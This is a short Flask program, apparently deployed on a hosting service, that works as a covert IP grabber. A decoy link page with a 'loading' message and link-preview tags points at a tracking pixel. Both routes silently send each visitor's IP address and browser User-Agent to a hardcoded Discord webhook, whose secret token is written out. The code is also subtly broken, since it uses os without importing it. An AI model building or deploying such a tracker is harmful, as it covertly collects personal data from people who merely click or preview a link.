from flask import Flask, request, Response
from datetime import datetime
import requests
import threading

app = Flask(__name__)
WEBHOOK = "https://discord.com/api/webhooks/1446892630742143006/hrJrXFhVtRFXyPOstS6wi4jguM1iR-pT8874cRhJ4D8z_pnxdwOR0zScrjUSceR8s4EJ"

PIXEL = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"

def send_to_webhook(ip, ua):
    payload = {
        "content": "테스트",
        "username": "IP 수집기",
        "embeds": [{
            "title": "테스트",
            "fields": [
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "User-Agent", "value": f"```{ua[:500]}```", "inline": False}
            ],
            "color": 16711680,
            "timestamp": datetime.utcnow().isoformat()
        }]
    }
    threading.Thread(target=requests.post, args=(WEBHOOK,), kwargs={"json": payload}).start()

@app.route('/')
def root():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent', 'Unknown')
    send_to_webhook(ip, ua)
    html = '''<!DOCTYPE html>
<html>
<head>
    <meta property="og:title" content="?">
    <meta property="og:description" content="ㅄ">
    <meta property="og:image" content="https://sibalgoa.onrender.com/pixel">
    <meta property="og:type" content="website">
</head>
<body><h1>로딩중...</h1></body>
</html>'''
    return html

@app.route('/pixel')
def pixel():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent', 'Unknown')
    send_to_webhook(ip, ua)
    
    return Response(PIXEL, mimetype='image/png')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
